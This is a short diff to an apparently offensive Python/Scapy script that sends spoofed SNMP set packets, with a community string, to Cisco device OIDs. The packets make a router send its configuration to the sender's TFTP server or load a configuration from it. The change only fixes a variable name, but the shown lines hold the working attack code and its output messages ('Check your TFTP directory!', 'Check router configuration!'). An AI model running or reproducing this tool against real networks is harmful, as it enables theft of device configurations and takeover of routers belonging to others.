@@ -73,7 +73,7 @@ def main(args):
             datagram = IP(src="%s" % spoof,dst="%s" % dst_ip)/UDP(sport=160,dport=161)/SNMP(community="%s" % com_string,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.55." + src_ip),value=file)]))
             send(datagram)
             print("[+] Sent datagram with attributes:\n")
-            ls(packet)
+            ls(datagram)
             print("\n[+] Check your TFTP directory!")
 
         except Exception as msg:
@@ -88,7 +88,7 @@ def main(args):
             datagram = IP(src="%s" % spoof,dst="%s" % dst_ip)/UDP(sport=160,dport=161)/SNMP(community="%s" % com_string,PDU=SNMPset(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.4.1.9.2.1.53." + src_ip),value=file)]))
             send(datagram)
             print("[+] Sent datagram with attributes:\n")
-            ls(packet)
+            ls(datagram)
             print("\n[+] Check router configuration!")
 
         except Exception as msg:
